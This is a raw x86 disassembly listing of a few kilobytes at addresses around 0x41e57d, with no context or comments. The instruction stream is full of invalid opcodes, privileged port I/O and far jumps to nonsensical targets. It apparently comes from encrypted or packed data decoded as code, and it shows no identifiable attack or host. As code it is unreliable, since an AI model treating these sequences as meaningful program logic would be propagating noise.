  41e57d:	push   es
  41e57e:	mov    ebp,0xc4e0c7f0
  41e583:	ftst   
  41e585:	or     eax,0xcacde408
  41e58a:	enter  0xc2c2,0xe0
  41e58e:	(bad)  
  41e58f:	in     al,dx
  41e590:	sti    
  41e591:	in     eax,dx
  41e592:	out    dx,eax
  41e593:	mov    dh,0xdc
  41e595:	sti    
  41e596:	retf   0xd3d3
  41e599:	aam    0x2
  41e59b:	hlt    
  41e59c:	rcr    esi,0xbc
  41e59f:	add    al,0xea
  41e5a1:	std    
  41e5a2:	out    dx,eax
  41e5a3:	lds    eax,FWORD PTR [edi]
  41e5a5:	int    0xe2
  41e5a7:	add    ebx,ebp
  41e5a9:	mov    eax,0xebe2c8e4
  41e5ae:	loope  0x41e591
  41e5b0:	shl    BYTE PTR [ebp-0x13423546],0xca
  41e5b7:	rcl    ah,1
  41e5b9:	aad    0xbd
  41e5bb:	test   DWORD PTR [eax],0xf9dfdcd3
  41e5c1:	call   0xca41f1a9
  41e5c6:	in     al,0xeb
  41e5c8:	mov    ecx,0xf7ced0c3
  41e5cd:	(bad)  
  41e5ce:	iret   
  41e5cf:	shl    BYTE PTR [ecx-0x29460e18],1
  41e5d5:	sar    BYTE PTR [edi-0x3c462613],1
  41e5db:	add    DWORD PTR [edx],eax
  41e5dd:	(bad)  
  41e5de:	loope  0x41e5b0
  41e5e0:	leave  
  41e5e1:	aam    0x9
  41e5e3:	loop   0x41e5b9
  41e5e5:	(bad)  
  41e5e7:	in     eax,0xcd
  41e5e9:	out    0xee,al
  41e5eb:	jmp    0x41e5e4
  41e5ed:	loopne 0x41e5d3
  41e5ef:	jmp    0xc8c4:0xd1caf4b9
  41e5f6:	jmp    0xd3d9:0xd0def0d5
  41e5fd:	xlat   BYTE PTR ds:[ebx]
  41e5fe:	(bad)  
  41e5ff:	aam    0xe7
  41e601:	jmp    0x41e5e8
  41e603:	in     al,0xa
  41e605:	add    esi,ebx
  41e607:	stc    
  41e608:	repnz lods al,BYTE PTR ds:[esi]
  41e60a:	retf   
  41e60b:	ret    
  41e60c:	cmc    
  41e60d:	out    0xb2,al
  41e60f:	shl    esp,0xf1
  41e612:	into   
  41e613:	mov    al,0xf4
  41e615:	mov    eax,0xe703c2ff
  41e61a:	add    dh,bh
  41e61c:	rol    DWORD PTR [ebx],1
  41e61e:	or     ebx,eax
  41e620:	(bad)
  41e623:	paddw  mm7,mm6
  41e626:	repz sar BYTE PTR [esi-0x11491137],cl
  41e62d:	(bad)  
  41e62e:	aad    0xf9
  41e630:	mov    bh,0xf7
  41e632:	sar    bh,cl
  41e634:	cli    
  41e635:	mov    eax,0xd1d8f8f4
  41e63a:	loop   0x41e63c
  41e63c:	cli    
  41e63d:	add    cl,bl
  41e63f:	sar    edx,0xc4
  41e642:	cld    
  41e643:	fsubrp st(1),st
  41e645:	lds    eax,FWORD PTR [eax]
  41e647:	ror    bh,cl
  41e649:	leave  
  41e64a:	retf   
  41e64b:	lock loopne 0x41e63b
  41e64e:	in     eax,dx
  41e64f:	mov    bl,0xf0
  41e651:	fnstenv [eax+edx*8-0x26254232]
  41e658:	enter  0xe1b8,0xf2
  41e65c:	test   dh,0xd4
  41e65f:	loope  0x41e643
  41e661:	in     al,0x0
  41e663:	(bad)  
  41e664:	fsubr  st(6),st
  41e666:	std    
  41e667:	or     eax,0xebf1d7aa
  41e66c:	(bad)
  41e66f:	mov    bh,0xc8
  41e671:	retf   
  41e672:	(bad)
  41e676:	fadd   QWORD PTR [ebx]
  41e678:	out    dx,al
  41e679:	fcom   st(0)
  41e67b:	xlat   BYTE PTR ds:[ebx]
  41e67c:	sar    DWORD PTR [esi-0x3d161e1b],cl
  41e682:	shl    esi,0xd8
  41e685:	jecxz  0x41e656
  41e687:	in     eax,dx
  41e688:	(bad)  
  41e68a:	loopne 0x41e669
  41e68c:	jmp    0xc4f2:0xb5f7dae5
  41e693:	in     eax,0xde
  41e695:	jmp    0x41e694
  41e697:	idiv   ebp
  41e699:	icebp  
  41e69a:	out    dx,al
  41e69b:	mov    esi,0xfadbd7e6
  41e6a0:	fild   DWORD PTR [edx]
  41e6a2:	std    
  41e6a3:	inc    esi
  41e6a5:	ret    0xefc1
  41e6a8:	in     al,dx
  41e6a9:	jmp    0xd208bc5a
  41e6ae:	retf   0xb5db
  41e6b1:	sti    
  41e6b2:	(bad)  
  41e6b3:	fdivp  st(5),st
  41e6b5:	mov    esi,0xdcd7ffce
  41e6ba:	fiadd  DWORD PTR [edx]
  41e6bc:	in     eax,0xc6
  41e6be:	(bad)  
  41e6c0:	in     al,0xdd
  41e6c2:	fadd   st,st(5)
  41e6c4:	out    0xc,al
  41e6c6:	call   0xb434bfd8
  41e6cb:	mov    esi,0xc5e7aae6
  41e6d0:	fdivr  DWORD PTR [eax-0x4137152a]
  41e6d6:	icebp  
  41e6d7:	sti    
  41e6d8:	(bad)  
  41e6da:	stc    
  41e6db:	loop   0x41e6b7
  41e6dd:	std    
  41e6de:	add    dh,ch
  41e6e0:	fcomp  st(7)
  41e6e2:	xlat   BYTE PTR ds:[ebx]
  41e6e3:	cmc    
  41e6e4:	retf   0xe4fa
  41e6e7:	adc    edi,esp
  41e6e9:	loopne 0x41e6db
  41e6eb:	mov    esp,0xe0d1e7ce
  41e6f0:	scas   eax,DWORD PTR es:[edi]
  41e6f1:	leave  
  41e6f2:	cli    
  41e6f3:	aad    0xe5
  41e6f5:	mov    edx,0x1f7efe9
  41e6fa:	loop   0x41e6f9
  41e6fc:	(bad)  
  41e6fd:	aad    0xd1
  41e6ff:	out    0xf7,al
  41e701:	call   0xf4dcefd
  41e706:	jmp    0xedbd:0xf7ebc8e4
  41e70d:	div    BYTE PTR [esi-0x48064d4e]
  41e713:	repz rcl esi,1
  41e716:	mov    ebp,0xc7b802c9
  41e71b:	in     eax,0xc3
  41e71d:	cli    
  41e71e:	(bad)  
  41e71f:	neg    al
  41e721:	fnclex 
  41e723:	out    0xc3,al
  41e725:	leave  
  41e726:	jmp    0xe1ef:0xeee6e7d9
  41e72d:	out    dx,eax
  41e72e:	aad    0xe6
  41e730:	aam    0xe4
  41e732:	repz fidiv WORD PTR [ebp-0x2f46371c]
  41e739:	aam    0xc7
  41e73b:	fadd   QWORD PTR ds:0xf1e7c60b
  41e741:	cli    
  41e742:	aam    0x3
  41e744:	pop    es
  41e745:	pop    es
  41e746:	fadd   DWORD PTR [ebx]
  41e748:	mov    cl,0xc4
  41e74a:	scas   al,BYTE PTR es:[edi]
  41e74b:	in     eax,0xbc
  41e74d:	fadd   st(7),st
  41e74f:	out    0xcb,al
  41e751:	sti    
  41e752:	icebp  
  41e753:	dec    ebx
  41e755:	repnz mov cl,0xf9
  41e758:	in     eax,dx
  41e759:	fcom   st(6)
  41e75b:	inc    DWORD PTR [eax]
  41e75d:	fcmove st,st(3)
  41e75f:	vpminub xmm3,xmm2,xmm7
  41e763:	(bad)  
  41e764:	fninit 
  41e766:	add    ch,ah
  41e768:	out    0xad,al
  41e76a:	enter  0xc2be,0xac
  41e76e:	mov    dl,0xd3
  41e770:	jmp    0x41e762
  41e772:	(bad)  
  41e773:	mov    ch,0xb4
  41e775:	mov    edi,0xfecce1e8
  41e77a:	pop    es
  41e77b:	add    al,BYTE PTR [edx]
  41e77d:	add    dl,bh
  41e77f:	or     edx,edi
  41e781:	xlat   BYTE PTR ds:[ebx]
  41e782:	stc    
  41e783:	(bad)  
  41e785:	or     ecx,ecx
  41e787:	int3   
  41e788:	icebp  
  41e789:	leave  
  41e78a:	(bad)  [esi-0x4c102919]
  41e790:	mov    dh,0xd6
  41e792:	(bad)  
  41e793:	shl    edi,cl
  41e795:	mov    ah,0xb1
  41e797:	(bad)  
  41e799:	out    dx,al
  41e79a:	clc    
  41e79b:	repnz mov edi,0xcbd7c2dc
  41e7a1:	enter  0xcbdd,0xe3
  41e7a5:	out    dx,eax
  41e7a6:	add    esp,ecx
  41e7a8:	rol    esi,cl
  41e7aa:	int3   
  41e7ab:	mov    al,0xe3
  41e7ad:	aad    0xd1
  41e7af:	mov    ah,0xaf
  41e7b1:	scas   al,BYTE PTR es:[edi]
  41e7b2:	shl    BYTE PTR [ecx+ecx*8-0x460c2316],cl
  41e7b9:	add    bh,BYTE PTR [esi-0x2d001c2a]
  41e7bf:	loope  0x41e7cc
  41e7c1:	hlt    
  41e7c2:	add    ecx,edi
  41e7c4:	or     bl,cl
  41e7c6:	jmp    0xd5d7:0xe1b2ab0a
  41e7cd:	ror    esi,cl
  41e7cf:	rcl    ch,0xb9
  41e7d2:	stc    
  41e7d3:	in     eax,dx
  41e7d4:	mov    ecx,0xe001d5ca
  41e7d9:	mov    eax,0xd7dfdcd5
  41e7de:	shl    dh,cl
  41e7e0:	out    0xf7,al
  41e7e2:	jmp    0xe3fd:0xece8efe3
  41e7e9:	into   
  41e7ea:	in     al,dx
  41e7eb:	mov    dh,0xab
  41e7ed:	mov    cl,0xd2
  41e7ef:	imul   ch
  41e7f1:	sar    dl,1
  41e7f3:	into   
  41e7f4:	mov    bh,0xd2
  41e7f6:	ror    dh,1
  41e7f8:	stc    
  41e7f9:	loop   0x41e7d5
  41e7fb:	in     al,dx
  41e7fc:	loope  0x41e805
  41e7fe:	fiadd  WORD PTR [ebx]
  41e800:	clc    
  41e801:	mov    esi,0xc20afa00
  41e806:	push   es
  41e807:	repnz shr DWORD PTR [ecx-0x11531b51],cl
  41e80e:	xlat   BYTE PTR ds:[ebx]
  41e80f:	retf   0xbbcb
  41e812:	(bad)  
  41e814:	not    cl
  41e816:	ror    esp,cl
  41e818:	(bad)  
  41e81a:	loopne 0x41e7df
  41e81c:	ret    0xf5bd
  41e81f:	sar    ah,1
  41e821:	out    0xc7,al
  41e823:	add    eax,0xd8e1f80b
  41e828:	retf   
  41e829:	shl    eax,cl
  41e82b:	xlat   BYTE PTR ds:[ebx]
  41e82c:	(bad)  
  41e82d:	in     eax,dx
  41e82e:	(bad)  [ecx-0x28343735]
  41e834:	aad    0xf1
  41e836:	fdiv   st(4),st
  41e838:	out    dx,eax
  41e839:	cmc    
  41e83a:	cli    
  41e83b:	mov    ebp,0xfefce3d5
  41e840:	or     ebp,ebx
  41e842:	std    
  41e843:	fscale 
  41e845:	ret    0xd9f3
  41e848:	jmp    0x41e829
  41e84a:	fstp   st(5)
  41e84c:	mov    bl,0xe7
  41e84e:	repz shl ecx,0xe7
  41e852:	(bad)
  41e855:	mov    ch,0xbb
  41e857:	mov    eax,0xd806e203
  41e85c:	rcl    dl,1
  41e85e:	out    0xf7,al
  41e860:	test   BYTE PTR ds:0xcdc3cfc4,0x12
  41e867:	add    al,bh
  41e869:	div    ebx
  41e86b:	ret    0xf2b1
  41e86e:	hlt    
  41e86f:	enter  0xb5d3,0xb6
  41e873:	retf   0xefc4
  41e876:	mov    esp,0xf9cd00d4
  41e87b:	fcmovnu st,st(4)
  41e87d:	sti    
  41e87e:	hlt    
  41e87f:	add    edx,ebp
  41e881:	push   es
  41e882:	add    esp,eax
  41e884:	fldz   
  41e886:	add    BYTE PTR [edx],cl
  41e888:	iret   
  41e889:	loope  0x41e86f
  41e88b:	aad    0xd1
  41e88d:	ror    ch,cl
  41e88f:	hlt    
  41e890:	scas   eax,DWORD PTR es:[edi]
  41e891:	out    0xd0,al
  41e893:	sar    al,cl
  41e895:	in     al,dx
  41e896:	lock mov ebp,0xfaf1fcc9
  41e89c:	xlat   BYTE PTR ds:[ebx]
  41e89d:	fild   DWORD PTR [edi]
  41e89f:	mov    eax,0xd6bd09ea
  41e8a4:	in     eax,dx
  41e8a5:	aam    0x0
  41e8a7:	repnz fmul st(7),st
  41e8aa:	jmp    0x41e85d
  41e8ac:	(bad)  
  41e8ad:	scas   al,BYTE PTR es:[edi]
  41e8ae:	jecxz  0x41e89c
  41e8b0:	(bad)
  41e8b3:	retf   0x3ce
  41e8b6:	hlt    
  41e8b7:	jecxz  0x41e8a7
  41e8b9:	(bad)  
  41e8ba:	mov    eax,0xda04fabe
  41e8bf:	fidivr DWORD PTR [edi+0xbebc7c7]
  41e8c5:	retf   0x1dc
  41e8c8:	ret    0xa9ae
  41e8cb:	out    dx,eax
  41e8cc:	fsub   st(4),st
  41e8ce:	into   
  41e8cf:	mov    dh,0xcb
  41e8d1:	fdiv   DWORD PTR [ecx-0x2c130016]
  41e8d7:	shr    bh,1
  41e8d9:	mov    dh,0xd6
  41e8db:	add    bh,dl
  41e8dd:	int3   
  41e8de:	loope  0x41e8e2
  41e8e0:	(bad)  
  41e8e2:	in     al,0x9
  41e8e4:	(bad)  
  41e8e6:	push   cs
  41e8e7:	fnstcw WORD PTR [ebp-0x3110501e]
  41e8ed:	in     al,0xcb
  41e8ef:	cmc    
  41e8f0:	repz retf 
  41e8f2:	jmp    0x41e8e1
  41e8f4:	mov    dh,0xdf
  41e8f6:	mov    esi,0xfc00e1bf
  41e8fb:	fcmovu st,st(7)
  41e8fd:	ret    0xfe04
  41e900:	jmp    0xc50acde4
  41e905:	out    0xdb,eax
  41e907:	loop   0x41e8f8
  41e909:	mov    ebp,0xdcb0e8df
  41e90e:	ret    0xe4b3
  41e911:	iret   
  41e912:	cmc    
  41e913:	out    dx,al
  41e914:	fdivp  st(3),st
  41e916:	fcmovu st,st(7)
  41e918:	mov    esi,0xc6fff0ff
  41e91d:	(bad)  
  41e91f:	add    dl,cl
  41e921:	mov    esi,0xc6cee80e
  41e926:	adc    ecx,edi
  41e928:	(bad)  
  41e929:	out    dx,eax
  41e92a:	out    0xc9,eax
  41e92c:	(bad)  
  41e92d:	jmp    0xe9ff:0xcaf4c4b0
  41e934:	mov    eax,0xf6dbf9ec
  41e939:	sar    ebp,1
  41e93b:	(bad)  
  41e93d:	fstp   st(6)
  41e93f:	(bad)
  41e943:	les    eax,FWORD PTR [eax]
  41e945:	fucomip st,st(6)
  41e947:	(bad)  
  41e949:	mov    bl,0xb3
  41e94b:	(bad)  
  41e94d:	iret   
  41e94e:	rol    al,cl
  41e950:	(bad)  
  41e951:	in     eax,dx
  41e952:	aad    0xfb
  41e954:	(bad)  
  41e955:	aad    0xf0
  41e957:	iret   
  41e958:	fscale 
  41e95a:	jecxz  0x41e922
  41e95c:	repz rcr bh,0xa
  41e960:	mov    DWORD PTR [edx+eax*1],0x6c605df
  41e967:	fsubr  DWORD PTR [esi-0x323d432f]
  41e96d:	mov    al,0xb6
  41e96f:	(bad)  
  41e970:	jmp    0x41e94d
  41e972:	(bad)
  41e975:	mov    dl,0xe3
  41e977:	ret    
  41e978:	call   0xfc40ac71
  41e97d:	shl    dl,0xe7
  41e980:	xlat   BYTE PTR ds:[ebx]
  41e981:	jmp    0xdf13:0xc607e4f5
  41e988:	ret    0xbcc3
  41e98b:	scas   al,BYTE PTR es:[edi]
  41e98c:	mov    dl,0xd5
  41e98e:	mov    bl,0xc0
  41e990:	jmp    0x41c56d
  41e995:	(bad)  
  41e997:	shl    DWORD PTR [edi+0x5d7d8d4],cl
  41e99d:	add    al,0xe2
  41e99f:	ret    
  41e9a0:	in     al,0x3
  41e9a2:	jmp    0xcc0bb8a4
  41e9a7:	loop   0x41e985
  41e9a9:	fisubr WORD PTR [esi-0x2416195c]
  41e9af:	in     eax,0xc7
  41e9b1:	mov    eax,0xf3c8d3da
  41e9b6:	mov    eax,0xd6e1f6f0
  41e9bb:	add    esi,ebp
  41e9bd:	in     al,0xf9
  41e9bf:	rcl    ebp,1
  41e9c1:	neg    esi
  41e9c3:	in     eax,0xe0
  41e9c5:	fstp   st(5)
  41e9c7:	adc    ecx,esp
  41e9c9:	rcl    bh,cl
  41e9cb:	out    dx,al
  41e9cc:	leave  
  41e9cd:	in     eax,dx
  41e9ce:	int3   
  41e9cf:	mov    al,0xdb
  41e9d1:	cli    
  41e9d2:	out    dx,al
  41e9d3:	not    dl
  41e9d5:	fdivr  st(2),st
  41e9d7:	mov    ebx,0xdfb8c2f7
  41e9dc:	ret    
  41e9dd:	add    bl,bh
  41e9df:	xlat   BYTE PTR ds:[ebx]
  41e9e0:	idiv   edi
  41e9e2:	in     al,0xdd
  41e9e4:	(bad)  
  41e9e5:	jmp    0x41e9f2
  41e9e7:	fstp   st(5)
  41e9e9:	jmp    0x41e9b7
  41e9eb:	(bad)  
  41e9ed:	lock into 
  41e9ef:	mov    al,0xf5
  41e9f1:	mov    dl,0xc7
  41e9f3:	mov    ah,0xf6
  41e9f5:	mov    dh,0xb1
  41e9f7:	mov    esi,0xf2f6d7dc
  41e9fc:	fucom  st(4)
  41e9fe:	mov    ebp,0xeafdc307
  41ea03:	or     eax,0xe4cae7ee
  41ea08:	int    0xe5
  41ea0a:	int3   
  41ea0b:	ret    0xe4e1
  41ea0e:	test   dh,0xb2
  41ea11:	aad    0xd9
  41ea13:	fcom   st(5)
  41ea15:	mov    ebp,0xecc8d2f1
  41ea1a:	out    dx,al
  41ea1b:	mov    esp,0xb8fbe1d7
  41ea20:	cli    
  41ea21:	add    eax,edi
  41ea23:	cmc    
  41ea24:	or     al,0xcc
  41ea26:	push   es
  41ea27:	adc    edx,ecx
  41ea29:	(bad)
  41ea2c:	mov    bl,0xe7
  41ea2e:	aad    0xb7
  41ea30:	enter  0xb7c5,0xf2
  41ea34:	(bad)  
  41ea35:	sar    bh,1
  41ea37:	add    bh,bl
  41ea39:	loope  0x41e9fc
  41ea3b:	int    0xdf
  41ea3d:	add    eax,0x807ffdc
  41ea42:	fdivr  st,st(6)
  41ea44:	(bad)  
  41ea45:	(bad)  
  41ea47:	enter  0xe7eb,0xc9
  41ea4b:	xlat   BYTE PTR ds:[ebx]
  41ea4c:	shl    esi,cl
  41ea4e:	vfmadd231pd ymm1,ymm5,ymm5
  41ea53:	mov    edi,0xbfbbd7df
  41ea58:	cmc    
  41ea59:	hlt    
  41ea5a:	stc    
  41ea5b:	lock in al,dx
  41ea5d:	in     al,0xf7
  41ea5f:	stc    
  41ea60:	fcmovb st,st(1)
  41ea62:	(bad)  
  41ea64:	aam    0x9
  41ea66:	(bad)  
  41ea68:	loopne 0x41ea4e
  41ea6a:	out    dx,al
  41ea6b:	mov    bh,0xb6
  41ea6d:	loopne 0x41ea3d
  41ea6f:	int    0xc8
  41ea71:	aad    0xc4
  41ea73:	mov    esi,0xe1f2b2d6
  41ea78:	mov    ecx,0xecfef3ef
  41ea7d:	repnz add ebx,ecx
  41ea80:	stc    
  41ea81:	cli    
  41ea82:	or     bh,dl
  41ea84:	add    cl,ch
  41ea86:	push   es
  41ea87:	repnz scas eax,DWORD PTR es:[edi]
  41ea89:	mov    esi,0xc3afd0bc
  41ea8e:	mov    bh,0xb3
  41ea90:	les    esi,FWORD PTR [esi-0x442b100b]
  41ea96:	repnz (bad) 
  41ea98:	mov    edx,0xbddcc3f0
  41ea9d:	add    eax,esp
  41ea9f:	rcr    edi,0xe4
  41eaa2:	mov    ebp,0xe4eac607
  41eaa7:	iret   
  41eaa8:	(bad)  
  41eaaa:	retf   
  41eaab:	leave  
  41eaac:	lods   eax,DWORD PTR ds:[esi]
  41eaad:	mov    dh,0xc8
  41eaaf:	fcmovnbe st,st(7)
  41eab1:	sar    al,cl
  41eab3:	fnstsw WORD PTR [ebx+0x2eee3ea]
  41eab9:	std    
  41eaba:	loop   0x41eabd
  41eabc:	cmc    
  41eabd:	fcmovu st,st(5)
  41eabf:	add    cl,ch
  41eac1:	loope  0x41ea99
  41eac3:	add    ch,bh
  41eac5:	or     esp,ebx
  41eac7:	fnstcw WORD PTR [ecx+eax*8-0x494e1839]
  41eace:	out    0xd7,eax
  41ead0:	mov    ebx,0xf5faf6f4
  41ead5:	out    dx,al
  41ead6:	enter  0xe0e8,0xd0
  41eada:	add    eax,DWORD PTR [edx]
  41eadc:	faddp  st(4),st
  41eade:	add    eax,0xf6dc0601
  41eae3:	out    dx,eax
  41eae4:	out    dx,eax
  41eae5:	cld    
  41eae6:	cld    
  41eae7:	adc    DWORD PTR [edx-0x292a0c16],esi
  41eaed:	jecxz  0x41eae3
  41eaef:	jmp    0xf30db6a7
  41eaf4:	mov    edx,0xbbecfff8
  41eaf9:	in     eax,dx
  41eafa:	jecxz  0x41eae3
  41eafc:	fsub   st(4),st
  41eafe:	or     eax,ebp
  41eb00:	mov    edi,0xdbeb0bdf
  41eb05:	jecxz  0x41eae1
  41eb07:	fsubr  st(1),st
  41eb09:	retf   0xb6bf
  41eb0c:	out    dx,eax
  41eb0d:	into   
  41eb0e:	idiv   ebx
  41eb10:	jmp    0xf43bb70f
  41eb15:	out    dx,al
  41eb16:	mov    ah,0xe8
  41eb18:	shl    dl,cl
  41eb1a:	sar    ah,0xd9
  41eb1d:	jmp    0x41eafe
  41eb1f:	in     al,0x8
  41eb21:	xlat   BYTE PTR ds:[ebx]
  41eb22:	push   es
  41eb23:	jecxz  0x41eb09
  41eb25:	in     eax,dx
  41eb26:	int3   
  41eb27:	int    0xc8
  41eb29:	call   0xb838dbe0
  41eb2e:	repz (bad) 
  41eb31:	icebp  
  41eb32:	aam    0xe8
  41eb34:	int3   
  41eb35:	fmul   st(3),st
  41eb37:	stc    
  41eb38:	inc    BYTE PTR [edx]
  41eb3a:	ret    
  41eb3b:	repnz int 0xc2
  41eb3e:	add    al,BYTE PTR ds:0xc9fb03f5
  41eb44:	jmp    0x41eb4e
  41eb46:	call   0xc82d9a27
  41eb4b:	mov    dl,0xb6
  41eb4d:	into   
  41eb4e:	not    cl
  41eb50:	(bad)  
  41eb51:	loopne 0x41eb2b
  41eb53:	ffreep st(5)
  41eb55:	repnz mov ebx,0xc7b601be
  41eb5b:	mov    ebp,0xc0dfe2c5
  41eb60:	fiadd  DWORD PTR [esi]
  41eb62:	(bad)  
  41eb63:	fld    QWORD PTR [ebx]
  41eb65:	jmp    0xc3c5:0xedceedea
  41eb6c:	(bad)  [ebp-0x203b1b4b]
  41eb72:	mov    ch,0xc9
  41eb74:	mov    ch,0xc8
  41eb76:	in     eax,dx
  41eb77:	stc    
  41eb78:	sar    cl,cl
  41eb7a:	fcmovnu st,st(7)
  41eb7c:	add    edi,eax
  41eb7e:	repz add ebp,esp
  41eb81:	or     dh,ah
  41eb83:	add    eax,DWORD PTR [esi]
  41eb85:	std    
  41eb86:	retf   0xdedf
  41eb89:	in     eax,dx
  41eb8a:	test   al,0xe7
  41eb8c:	out    0xae,eax
  41eb8e:	test   eax,0xbaebc1f3
  41eb93:	stc    
  41eb94:	call   0xe943dc91
  41eb99:	int    0xdf
  41eb9b:	xlat   BYTE PTR ds:[ebx]
  41eb9c:	lock fcmovnu st,st(2)
  41eb9f:	(bad)  
  41eba0:	fcomip st,st(5)
  41eba2:	stc    
  41eba3:	loop   0x41eba3
  41eba5:	add    esp,esp
  41eba7:	int    0xca
  41eba9:	shl    esi,cl
  41ebab:	loope  0x41eb5e
  41ebad:	in     al,0xe1
  41ebaf:	(bad)  
  41ebb0:	fdiv   DWORD PTR [esi-0x2030c09]
  41ebb6:	loop   0x41eb96
  41ebb8:	cld    
  41ebb9:	icebp  
  41ebba:	shl    ah,0xbb
  41ebbd:	int3   
  41ebbe:	retf   
  41ebbf:	fiadd  WORD PTR ds:0xe2f40b02
  41ebc5:	add    esp,eax
  41ebc7:	fistp  QWORD PTR [esi-0x13143a1a]
  41ebcd:	icebp  
  41ebce:	hlt    
  41ebcf:	mov    cl,0xf0
  41ebd1:	cli    
  41ebd2:	shl    BYTE PTR [esi-0x2f041107],1
  41ebd8:	(bad)  
  41ebd9:	fcmove st,st(5)
  41ebdb:	fstp   TBYTE PTR [edi-0x3c25f42e]
  41ebe1:	cld    
  41ebe2:	add    esp,ecx
  41ebe4:	push   es
  41ebe5:	(bad)  
  41ebe6:	loop   0x41ebb5
  41ebe8:	out    0xdf,eax
  41ebea:	div    DWORD PTR [edx-0xd520a37]
  41ebf0:	aad    0xed
  41ebf2:	cmc    
  41ebf3:	imul   bh
  41ebf5:	in     al,0xb8
  41ebf7:	hlt    
  41ebf8:	(bad)  
  41ebf9:	mov    edi,0x1bdffb9
  41ebfe:	fcomi  st,st(1)
  41ec00:	in     al,0xfb
  41ec02:	out    dx,eax
  41ec03:	fmul   QWORD PTR [edx]
  41ec05:	in     eax,0xff
  41ec07:	push   es
  41ec08:	out    0xb0,eax
  41ec0a:	(bad)  
  41ec0c:	loope  0x41ebe0
  41ec0e:	jmp    0xd2b4:0xb4caf2d7
  41ec15:	retf   0xe2ec
  41ec18:	xlat   BYTE PTR ds:[ebx]
  41ec19:	cli    
  41ec1a:	mov    ch,0xe1
  41ec1c:	loop   0x41ec17
  41ec1e:	loop   0x41ebff
  41ec20:	rcr    ch,1
  41ec22:	iret   
  41ec23:	jecxz  0x41ec20
  41ec25:	loopne 0x41ec2c
  41ec27:	or     ebp,DWORD PTR [ebp-0x1d301534]
  41ec2d:	(bad)  
  41ec2e:	hlt    
  41ec2f:	cmc    
  41ec30:	retf   
  41ec31:	in     eax,0xdf
  41ec33:	mov    esi,0xfec8d1dd
  41ec38:	(bad)  
  41ec39:	std    
  41ec3a:	loope  0x41ec1e
  41ec3c:	lock repz aam 0xcb
  41ec40:	add    cl,BYTE PTR [edi]
  41ec42:	(bad)  
  41ec43:	fsubp  st(5),st
  41ec45:	add    eax,0xaca7e3f9
  41ec4a:	mov    esi,0xcbaae9e7
  41ec4f:	out    dx,eax
  41ec50:	fcomp  st(3)
  41ec52:	mov    edi,0xc9cae4e4
  41ec57:	hlt    
  41ec58:	mov    ebx,0xd9e3f6c3
  41ec5d:	cld    
  41ec5e:	mul    ebx
  41ec60:	loop   0x41ec62
  41ec62:	push   cs
  41ec63:	jmp    edi
  41ec65:	out    dx,al
  41ec66:	repnz push cs
  41ec68:	call   0xcc069a17
  41ec6d:	repz test eax,0xf3e4f1cb
  41ec73:	stc    
  41ec74:	(bad)  
  41ec75:	mov    edx,0xf4c3decb
  41ec7a:	(bad)  
  41ec7c:	fstp   st(5)
  41ec7e:	ret    
  41ec7f:	out    0xb,eax
  41ec81:	shr    esi,0xf5
  41ec84:	out    dx,al
  41ec85:	in     eax,0xd9
  41ec87:	in     eax,dx
  41ec88:	mov    edi,0xf7bddfb1
  41ec8d:	ret    0xcbc4
  41ec90:	hlt    
  41ec91:	jmp    0x41ec8e
  41ec93:	sti    
  41ec94:	clc    
  41ec95:	cli    
  41ec96:	into   
  41ec97:	fcmovne st,st(4)
  41ec99:	lock inc cl
  41ec9c:	aam    0xd1
  41ec9e:	add    al,0xf1
  41eca0:	loope  0x41ec7b
  41eca2:	loope  0x41ec85
  41eca4:	int    0xc5
  41eca6:	bswap  edx
  41eca8:	mov    edi,0xc2d2f7b8
  41ecad:	rcl    ebx,cl
  41ecaf:	fcmovu st,st(1)
  41ecb1:	out    0xd2,eax
  41ecb3:	mov    edx,0xf5deeee8
  41ecb8:	mov    edx,0xd901daf3
  41ecbd:	mov    esp,0x5f7dfd7
  41ecc2:	add    cl,cl
  41ecc4:	(bad)  
  41ecc5:	jmp    0x41ecd0
  41ecc7:	adc    ah,ah
  41ecc9:	shl    esi,1
  41eccb:	mov    ebp,0xc7b5dbed
  41ecd0:	repz idiv BYTE PTR [ecx-0xa242147]
  41ecd7:	aam    0xef
  41ecd9:	(bad)  
  41ecda:	in     eax,dx
  41ecdb:	aam    0x1
  41ecdd:	loopne 0x41ece6
  41ecdf:	ror    BYTE PTR [eax],cl
  41ece1:	enter  0xc00a,0xc4
  41ece5:	in     eax,dx
  41ece6:	std    
  41ece7:	or     al,dh
  41ece9:	in     al,0xec
  41eceb:	shl    dh,1
  41eced:	lods   eax,DWORD PTR ds:[esi]
  41ecee:	shl    bh,1
  41ecf0:	loopne 0x41eca2
  41ecf2:	out    0xba,al
  41ecf4:	int    0xf0
  41ecf6:	lock mov ah,0xe9
  41ecf9:	aad    0xcc
  41ecfb:	hlt    
  41ecfc:	(bad)  
  41ecff:	xlat   BYTE PTR ds:[ebx]
  41ed00:	cmc    
  41ed01:	loopne 0x41eccd
  41ed03:	fmul   QWORD PTR ds:0xc30cc4c2
  41ed09:	mov    bl,0xbf
  41ed0b:	enter  0xb0f6,0xfb
  41ed0f:	lods   al,BYTE PTR ds:[esi]
  41ed10:	mov    edx,0xceffd6ea
  41ed15:	sar    ch,cl
  41ed17:	int    0xc3
  41ed19:	aad    0xf4
  41ed1b:	cli    
  41ed1c:	repnz add ebx,ecx
  41ed1f:	add    al,0xfb
  41ed21:	cli    
  41ed22:	out    dx,al
  41ed23:	or     al,bh
  41ed25:	enter  0x11e2,0xe9
  41ed29:	rol    bh,1
  41ed2b:	cmc    
  41ed2c:	scas   eax,DWORD PTR es:[edi]
  41ed2d:	leave  
  41ed2e:	test   eax,0xd6aec8d3
  41ed33:	(bad)  
  41ed34:	mov    ebp,0xe2cdd0fe
  41ed39:	rcr    ecx,0xc6
  41ed3c:	fild   WORD PTR ds:0x3fffae2
  41ed42:	out    dx,eax
  41ed43:	dec    dl
  41ed45:	in     al,dx
  41ed46:	int3   
  41ed47:	fsubr  st(1),st
  41ed49:	in     eax,0xf2
  41ed4b:	mov    ebp,0xb1a9f4b1
  41ed50:	sti    
  41ed51:	out    0xc4,eax
  41ed53:	in     al,0xee
  41ed55:	fst    st(2)
  41ed57:	mov    ebp,0xe6f6ecf0
  41ed5c:	loope  0x41ed3e
  41ed5e:	(bad)  
  41ed5f:	(bad)  
  41ed60:	loopne 0x41ed5a
  41ed62:	shr    ebx,0xd
  41ed65:	out    dx,al
  41ed66:	loop   0x41ed48
  41ed68:	mov    eax,0xbdbed6f0
  41ed6d:	in     al,dx
  41ed6e:	retf   
  41ed6f:	into   
  41ed70:	fcom   st(1)
  41ed72:	jmp    0xf0f8:0xf1bff5e8
  41ed79:	mov    dh,0xd8
  41ed7b:	cmc    
  41ed7c:	stc    
  41ed7d:	aam    0xfa
